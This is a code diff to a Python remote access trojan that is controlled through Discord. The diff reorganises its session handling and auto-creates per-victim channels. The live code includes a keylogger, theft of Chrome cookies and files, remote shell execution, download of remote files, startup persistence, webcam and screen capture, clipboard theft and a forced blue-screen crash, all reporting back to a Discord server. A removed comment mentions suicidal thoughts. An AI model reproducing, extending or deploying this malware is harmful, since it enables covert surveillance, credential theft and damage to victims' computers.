@@ -4,7 +4,6 @@ from discord.ext import commands
 import pyautogui
 import requests
 import base64
-import codecs
 import threading
 import os
 import json
@@ -14,7 +13,6 @@ from Cryptodome.Cipher import AES
 from keyboard import read_event
 from subprocess import call
 from zipfile import ZipFile
-import random
 import shutil
 import pyperclip
 import ctypes
@@ -26,8 +24,9 @@ import time
 from screeninfo import get_monitors
 from PIL import Image
 import hashlib
-import pyvolume
-
+from discord.ext import commands
+from urllib.request import urlopen
+import re
 recording = False
 record_thread = None
 filename = "screen_capture.mp4"
@@ -118,9 +117,70 @@ while True:
 
         @bot.event
         async def on_ready():
+            print(f"Logged in as {bot.user}")
+        
+            # Replace with your server ID
+            guild = bot.get_guild("[SERVER_ID]")
+            if guild is None:
+                print("Guild not found!")
+                return
+        
+            # -------------------------------
+            # 1️⃣ Check or create 'ACCESS' category
+            access_category = discord.utils.get(guild.categories, name="ACCESS")
+            if access_category is None:
+                access_category = await guild.create_category("ACCESS")
+                print("Category 'ACCESS' created!")
+        
+            # 2️⃣ Check or create 'main' channel inside 'ACCESS'
+            main_channel = discord.utils.get(access_category.channels, name="main")
+            if main_channel is None:
+                main_channel = await guild.create_text_channel("main", category=access_category)
+                print("Channel 'main' created in 'ACCESS' category!")
+        
+            # -------------------------------
+            # 3️⃣ Check or create 'AGENTS' category
+            agents_category = discord.utils.get(guild.categories, name="AGENTS")
+            if agents_category is None:
+                agents_category = await guild.create_category("AGENTS")
+                print("Category 'AGENTS' created!")
+        
+            # 4️⃣ Check or create session channel in 'AGENTS' category
+            channel_name = f"{sesja}"  # your variable, not changed
+            agent_channel = discord.utils.get(agents_category.channels, name=channel_name)
+            if agent_channel is None:
+                agent_channel = await guild.create_text_channel(channel_name, category=agents_category)
+                print(f"Channel '{channel_name}' created in 'AGENTS' category!")
+        
+            # 5️⃣ Send the connection message
+            await agent_channel.send("<@USER_ID> Agent Connected")
+            print(f"Message sent in '{channel_name}'!")
             print("Connection established successfully.")
+            @bot.event
+            async def on_message(message):
+                global session
+                # Ignore messages from bots
+                if message.author.bot:
+                    return
+
+                # Only react to messages from the target user
+                if message.author.id == "[USER_ID]" and message.content.strip() == "access":
+                    if message.channel.name.lower() == "main":
+                        session = "all"
+                    else:
+                        try:
+                            session = sesja  # Try to convert channel name to int
+                        except ValueError:
+                            session = sesja  # fallback if not an integer
+
+                    print(f"Session set to: {session}")
+
+                # Make sure commands still work if you have them
+                await bot.process_commands(message)
         @bot.command()
         async def shell(ctx, *args):
+            global session
+            global sesja
             session = args[0]
             output = args[1]
             command = " ".join(args[2:])
@@ -139,7 +199,9 @@ while True:
                         os.system(command)
 
         @bot.command()
-        async def ss(ctx, session, monitor):
+        async def ss(ctx, monitor):
+            global session
+            global sesja
             monitor = int(monitor)
             if session == "all":
                 with mss.mss() as sct:
@@ -160,9 +222,11 @@ while True:
                         os.remove("ss.png")
 
         @bot.command()
-        async def keylogger(ctx, sesion, action):
+        async def keylogger(ctx, action):
+            global session
+            global sesja
             global log
-            if sesion == "all":
+            if session == "all":
                 if action == "start":
                     sys = threading.Thread(target=keyloggerSTART, name="sys")
                     sys.start()
@@ -179,7 +243,7 @@ while True:
                             
                         
             else:
-                if sesion == sesja:
+                if session == sesja:
                     if action == "start":
                         sys = threading.Thread(target=keyloggerSTART, name="sys")
                         sys.start()
@@ -195,9 +259,11 @@ while True:
                                 log = ""
 
         @bot.command()
-        async def steal(ctx, sesion, *args):
+        async def steal(ctx, *args):
+            global session
+            global sesja
             file_names = " ".join(args)
-            if sesion == "all":
+            if session == "all":
                 size = os.path.getsize(file_names)
                 if size > 8000000:
                     with open(file_names, 'rb') as file:
@@ -206,7 +272,7 @@ while True:
                 else:
                     await ctx.send("stolen", file=discord.File(file_names))
             else:
-                if sesion == sesja:
+                if session == sesja:
                     size = os.path.getsize(file_names)
                     if size > 8000000:
                         with open(file_names, 'rb') as file:
@@ -216,55 +282,64 @@ while True:
                         await ctx.send("stolen", file=discord.File(file_names))
 
         @bot.command()
-        async def info(ctx, sesion):
-            if sesion == "all":
+        async def info(ctx):
+            global session
+            global sesja
+            if session == "all":
                 grab_info()
                 await ctx.send(ipaddres, file=discord.File("log.zip"))
                 os.system("del log.zip")
             else:
-                if sesion == sesja:
+                if session == sesja:
                     grab_info()
                     await ctx.send(ipaddres, file=discord.File("log.zip"))
                     os.system("del log.zip")
                 
 
         @bot.command()
-        async def cd(ctx, sesion, *args):
+        async def cd(ctx, *args):
+            global session, sesja
             dir = " ".join(args)
-            if sesion == "all":
+            if session == "all":
                 os.chdir(dir)
             else:
-                if sesion == sesja:
+                if session == sesja:
                     os.chdir(dir)
 
         @bot.command()
-        async def up(ctx, sesion):
+        async def up(ctx):
+            global session
+            global sesja
             x = 0
-            if sesion == "all":
+            if session == "all":
                 while x < 100:
                     pyautogui.press('volumeup')
                     x = x + 1
             else:
-                if sesion == sesja:
+                if session == sesja:
                     while x < 100:
                         pyautogui.press('volumeup')
                         x = x + 1
 
         @bot.command()
-        async def down(ctx, sesion):
+        async def down(ctx):
+            global session
+            global sesja
             x = 0
-            if sesion == "all":
+            if session == "all":
                 while x < 100:
                     pyautogui.press('volumedown')
                     x = x + 1
             else:
-                if sesion == sesja:
+                if session == sesja:
                     while x < 100:
                         pyautogui.press('volumedown')
                         x = x + 1
 
         @bot.command()
-        async def delete(ctx, session, path):
+        async def delete(ctx, path):
+            global session
+            global sesja
             if session == "all":
                 try:
                     os.remove(path)
@@ -280,45 +355,53 @@ while True:
                         await ctx.send(f"An error occurred: {e}")
 
         @bot.command()
-        async def message(ctx, sesion, *args):
+        async def message(ctx, *args):
+            global session
+            global sesja
             title = args[0]
             button = args[1]
             message = " ".join(args[2:])
-            if sesion == "all":
+            if session == "all":
                 pyautogui.alert(text=message , title=title , button=button)
             else:
-                if sesion == sesja:
+                if session == sesja:
                     pyautogui.alert(text=message , title=title , button=button)
                     
 
         @bot.command()
-        async def dir(ctx, sesion):
-            if sesion == "all":
+        async def dir(ctx):
+            global session
+            global sesja
+            if session == "all":
                 await ctx.send(os.getcwd())
                 output = os.popen("dir").read()
                 await ctx.send(output)
             else:
-                if sesion == sesja:
+                if session == sesja:
                     await ctx.send(os.getcwd())
                     output = os.popen("dir").read()
                     await ctx.send(output)
 
         @bot.command()
-        async def upload(ctx, sesion, link = "", filename = "file.txt"):
-            if sesion == "all":
+        async def upload(ctx, link = "", filename = "file.txt"):
+            global session
+            global sesja
+            if session == "all":
                 r = requests.get(link)
                 with open(filename, 'wb') as f:
                     f.write(r.content)
                 await ctx.send("uploaded")
             else:
-                if sesion == sesja:
+                if session == sesja:
                     r = requests.get(link)
                     with open(filename, 'wb') as f:
                         f.write(r.content)
                     await ctx.send("uploaded")
 
         @bot.command()
-        async def klik(ctx, session, x = "0", y = "0"):
+        async def click(ctx, x = "0", y = "0"):
+            global session
+            global sesja
             if session == "all":
                 pyautogui.click(x=int(x), y=int(y))
             else:
@@ -326,7 +409,9 @@ while True:
                     pyautogui.click(x=int(x), y=int(y))
         
         @bot.command()
-        async def chrome(ctx, session, action):
+        async def chrome(ctx, action):
+            global session
+            global sesja
             if session == "all":
                 if action == "cookie":
                     cookieSteal()
@@ -340,7 +425,9 @@ while True:
                         os.system("del c.txt")
 
         @bot.command()
-        async def press(ctx, session, klawisz = "Enter"):
+        async def press(ctx, klawisz = "Enter"):
+            global session
+            global sesja
             if session == "all":
                 pyautogui.press(klawisz)
             else:
@@ -348,7 +435,9 @@ while True:
                     pyautogui.press(klawisz)
         
         @bot.command()
-        async def cli(ctx, session):
+        async def cli(ctx):
+            global session
+            global sesja
             if session == "all":
                 text = pyperclip.paste()
                 await ctx.send(text)
@@ -359,7 +448,9 @@ while True:
                     
 
         @bot.command()
-        async def write(ctx, session, *args):
+        async def write(ctx, *args):
+            global session
+            global sesja
             if session == "all":
                 pyautogui.write(" ".join(args))
             else:
@@ -367,7 +458,9 @@ while True:
                     pyautogui.write(" ".join(args))
 
         @bot.command()
-        async def loc(ctx, session):
+        async def loc(ctx):
+            global session
+            global sesja
             if session == "all":
                 r = requests.get(f"http://ip-api.com/json/{ipaddres}")
                 await ctx.send(r.text)
@@ -377,7 +470,9 @@ while True:
                     await ctx.send(r.text)
         
         @bot.command()
-        async def cdrom(ctx, session):
+        async def cdrom(ctx):
+            global session
+            global sesja
             if session == "all":
                 call("powershell -Command (New-Object -com 'WMPlayer.OCX').cdromcollection.item(0).Eject()", shell=True)
             else:
@@ -386,7 +481,9 @@ while True:
 
         
         @bot.command()
-        async def startup(ctx, session, *args):
+        async def startup(ctx, *args):
+            global session
+            global sesja
             appdata_path = os.path.expandvars('%appdata%')
             startupFolder = os.path.join(appdata_path, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
             filePATH = " ".join(args)
@@ -396,13 +493,8 @@ while True:
                 if session == sesja:
                     shutil.copy(filePATH, startupFolder)
         @bot.command()
-        async def camera(ctx, session: str = None):
-            """Take a single photo with the default webcam and send it back."""
-            # Optional: restrict access to a single authorized Discord account
-
-            # Optional: session check (keep your existing session flow if you want)
-            # if session != "all" and session != sesja:
-            #     return
+        async def camera(ctx):
+            global session
             global sesja
             if session == sesja:
 
@@ -489,7 +581,8 @@ while True:
             await ctx.send(f"session: {sesja} | IP address: {ipaddres} | Estimated Location: {location_info}")
 
         @bot.command()
-        async def rename(ctx, session, *args):
+        async def rename(ctx, *args):
+            global session
             global sesja
             if session == sesja:
                 nowaSesja = " ".join(args)
@@ -497,7 +590,9 @@ while True:
                 sesja = nowaSesja
 
         @bot.command()
-        async def wifi(ctx, session, action):
+        async def wifi(ctx, action):
+            global session
+            global sesja
             if session != "all" and session != sesja:
                 return
             if action.lower() not in ['on', 'off']:
@@ -517,7 +612,9 @@ while True:
                 await ctx.send(f"An error occurred: {str(e)}")
 
         @bot.command()
-        async def shutdown(ctx, session):
+        async def shutdown(ctx):
+            global session
+            global sesja
             if session == "all":
                 os.system("shutdown /s /f /t 1")
             else:
@@ -525,7 +622,9 @@ while True:
                     os.system("shutdown /s /f /t 1")
 
         @bot.command()
-        async def restart(ctx, session):
+        async def restart(ctx):
+            global session
+            global sesja
             if session == "all":
                 os.system("powershell.exe Restart-Computer -Force")
                 await ctx.send(f"The remote system {sesja} is being restarted.")
@@ -535,7 +634,9 @@ while True:
                     await ctx.send(f"The remote system {sesja} is being restarted.")
         
         @bot.command()
-        async def wallpaper(ctx, session, *args):
+        async def wallpaper(ctx, *args):
+            global session
+            global sesja
             if session == "all":
                 filePATH = " ".join(args)
                 filePATH = os.path.abspath(filePATH)
@@ -549,7 +650,9 @@ while True:
                     await ctx.send(f"wallpaper changed successfully")
         
         @bot.command()
-        async def kill(ctx, session, *args):
+        async def kill(ctx, *args):
+            global session
+            global sesja
             if session == "all":
                 task = " ".join(args)
                 os.system(f"taskkill /f /im {task}")
@@ -561,7 +664,9 @@ while True:
                     await ctx.send(f"task {task} killed successfull")
         
         @bot.command()
-        async def bsod(ctx, session):
+        async def bsod(ctx):
+            global session
+            global sesja
             if session == "all":
                 ERROR_CODE = 0xDEADDEAD
                 ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
@@ -571,31 +676,37 @@ while True:
                     ERROR_CODE = 0xDEADDEAD
                     ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                     ctypes.windll.ntdll.NtRaiseHardError(ERROR_CODE, 0, 0, None, 6, ctypes.byref(ctypes.c_uint()))
-        @bot.command()            
-        async def copy(ctx, *args):
-            session = args[0]
-            source_path = args[1]
-            dest_path = args[2]
 
-            async def do_copy():
-                try:
-                    if not os.path.exists(source_path):
-                        await ctx.send(f"Source file does not exist: {source_path}")
-                        return
-                    dest_dir = os.path.dirname(dest_path)
-                    if not os.path.exists(dest_dir):
-                        os.makedirs(dest_dir)
-
-                    shutil.copy2(source_path, dest_path)
-                    await ctx.send(f"File copied successfully from {source_path} to {dest_path}")
-                except Exception as e:
-                    await ctx.send(f"Failed to copy file: {str(e)}")
-
-            if session == "all":
-                await do_copy()
-            else:
-                if session == sesja: 
-                    await do_copy()
+        @bot.command()
+        async def copy(ctx, source_path: str, dest_path: str):
+            global session, sesja
+        
+            # Check session first
+            if session is None:
+                await ctx.send("Session not set. Use access first.")
+                return
+        
+            if session != "all" and session != sesja:
+                await ctx.send("You are not allowed to copy files in this session.")
+                return
+        
+            try:
+                # Check source exists
+                if not os.path.exists(source_path):
+                    await ctx.send(f"Source file does not exist: {source_path}")
+                    return
+        
+                # Create destination directory if needed
+                dest_dir = os.path.dirname(dest_path)
+                if dest_dir and not os.path.exists(dest_dir):
+                    os.makedirs(dest_dir)
+        
+                # Copy the file
+                shutil.copy2(source_path, dest_path)
+                await ctx.send(f"File copied successfully from {source_path} to {dest_path}")
+        
+            except Exception as e:
+                await ctx.send(f"Failed to copy file: {str(e)}")
         def scerecord(monitor_num=1):
             global recording, filename
             filename = f"screen_capture_monitor{monitor_num}.mp4"
@@ -632,13 +743,8 @@ while True:
                 print("Stopped recording.")
 
         @bot.command()
-        async def screenrecord(ctx, session, action, monitor: int = 1):
-            """
-            Usage: !screenrecord <session> <start/stop> [monitor_number]
-            Example: !screenrecord example start 2
-            """
-            global recording, record_thread, filename
-
+        async def screenrecord(ctx, action, monitor: int = 1):
+            global recording, record_thread, filename, session, sesja
             if session != sesja:
                 await ctx.send("Invalid session.")
                 return
@@ -668,7 +774,9 @@ while True:
                 else:
                     await ctx.send("No active recording.")
         @bot.command()
-        async def processes(ctx, session):
+        async def processes(ctx):
+            global session
+            global sesja
             if session == "all":
                 out = os.popen("tasklist").read()
                 for i in range(0, len(out), 2000):
@@ -679,7 +787,9 @@ while True:
                     for i in range(0, len(out), 2000):
                         await ctx.send(out[i:i+2000])
         @bot.command()
-        async def monitors(ctx, session):
+        async def monitors(ctx):
+            global session
+            global sesja
             if session == sesja:
                 monitors = get_monitors()
                 await ctx.send(f"Number of monitors: {len(monitors)}")
@@ -687,53 +797,41 @@ while True:
                 monitors = get_monitors()
                 await ctx.send(f"Number of monitors for session {sesja}: {len(monitors)}")
         @bot.command()
-        async def volume(ctx, session, percentage):
-            percentage = int(percentage)
-            if session == sesja:
-                pyvolume.custom(percent=percentage)
-            elif session == "all":
-                pyvolume.custom(percent=percentage)
-        #no one will ever see this command cuz people barely even check the comments on the code
-        #but i'm hurt bro, i have suicidal thoughts but nobody even notice that, so i'm writing this so maybe somebody will see this comment and actually feel me
-        #thanks for downloading this anyways
-        @bot.command()
         async def h(ctx):
             wiadomosc = '''
-        !bsod [session] - Shows a Blue Screen of Death (BSOD) on the remote computer.
-        !cd [session] [path] - Changes the current folder on the remote computer.
-        !cdrom [session] - Opens the CD/DVD drive.
-        !chrome [session] [action(cookie)] - Retrieves selected information from Chrome.
-        !cli [session] - Copies the contents of the clipboard from the remote computer.
-        !click [session] [x] [y] - Clicks on a specific location on the screen.
-        !delete [session] [path] - Deletes a file from the remote computer.
-        !dir [session] - Shows the files and folders in the current directory.
-        !down [session] - Lowers the volume on the remote computer.
-        !execute [session] [program] - Runs a program on the remote computer.
-        !info [session] - Shows system information about the remote computer.
-        !keylogger [session] [action(start, stop, log)] - Starts, stops, or views a keylogger.
-        !kill [session] [task] - Stops a specific running program.
-        !loc [session] - Shows IP and location information.
-        !message [session] [title] [button] [message] - Displays a pop-up message on the remote computer.
-        !press [session] [key] - Presses a key on the remote computer keyboard.
-        !rename [session] [new_name] - Changes the name of the current session.
-        !restart [session] - Restarts the remote computer.
-        !shell [session] [output(yes, no)] [command] - Runs a command on the remote computer.
+        !bsod - Shows a Blue Screen of Death (BSOD) on the remote computer.
+        !cd [path] - Changes the current folder on the remote computer.
+        !cdrom - Opens the CD/DVD drive.
+        !chrome [action(cookie)] - Retrieves selected information from Chrome.
+        !cli - Copies the contents of the clipboard from the remote computer.
+        !click [x] [y] - Clicks on a specific location on the screen.
+        !delete [path] - Deletes a file from the remote computer.
+        !dir - Shows the files and folders in the current directory.
+        !down - Lowers the volume on the remote computer.
+        !info - Shows system information about the remote computer.
+        !keylogger [action(start, stop, log)] - Starts, stops, or views a keylogger.
+        !kill [task] - Stops a specific running program.
+        !loc - Shows IP and location information.
+        !message [title] [button] [message] - Displays a pop-up message on the remote computer.
+        !press [key] - Presses a key on the remote computer keyboard.
+        !rename [new_name] - Changes the name of the current session.
+        !restart - Restarts the remote computer.
+        !shell [output(yes, no)] [command] - Runs a command on the remote computer.
         !sessions - Shows all active sessions.
-        !shutdown [session] - Turns off the remote computer.
-        !ss [session] [monitor] - Takes a screenshot of the remote computer screen.
-        !startup [session] [file path] - Adds a program to start automatically when the computer turns on.
-        !steal [session] [file_names] - Copies files from the remote computer.
-        !up [session] - Increases the volume on the remote computer.
-        !upload [session] [link] [file_name] - Sends a file to the remote computer.
-        !wallpaper [session] [path] - Changes the wallpaper on the remote computer.
-        !wifi [session] [on/off] - Turns the Wi-Fi on or off.
-        !write [session] [message] - Types a message on the remote computer.
-        !camera [session] - Takes a picture using the remote computer's camera.
-        !copy [session] [source_file] [destination_path] - Copies a file to another location.
-        !processes [session] - Lists all running processes.
-        !screenrecord [session] [action(start, stop)] [monitor] - Sends a screen record of the computer.
-        !monitors [session] - Reveals how many monitors does the computer have.
-        !volume [session] [volume percentage(0, 100)] - Changes the volume percentage on the computer. 
+        !shutdown - Turns off the remote computer.
+        !ss [monitor] - Takes a screenshot of the remote computer screen.
+        !startup [file path] - Adds a program to start automatically when the computer turns on.
+        !steal [file_names] - Copies files from the remote computer.
+        !up - Increases the volume on the remote computer.
+        !upload [link] [file_name] - Sends a file to the remote computer.
+        !wallpaper [path] - Changes the wallpaper on the remote computer.
+        !wifi [on/off] - Turns the Wi-Fi on or off.
+        !write [message] - Types a message on the remote computer.
+        !camera - Takes a picture using the remote computer's camera.
+        !copy [source_file] [destination_path] - Copies a file to another location.
+        !processes - Lists all running processes.
+        !screenrecord [action(start, stop)] [monitor] - Sends a screen record of the computer.
+        !monitors - Reveals how many monitors does the computer have
             '''
             for i in range(0, len(wiadomosc), 2000):
                 await ctx.send(wiadomosc[i:i+2000])
@@ -741,3 +839,4 @@ while True:
     except Exception as e:
         print(f"Error: {e}")
         sleep(5)
+
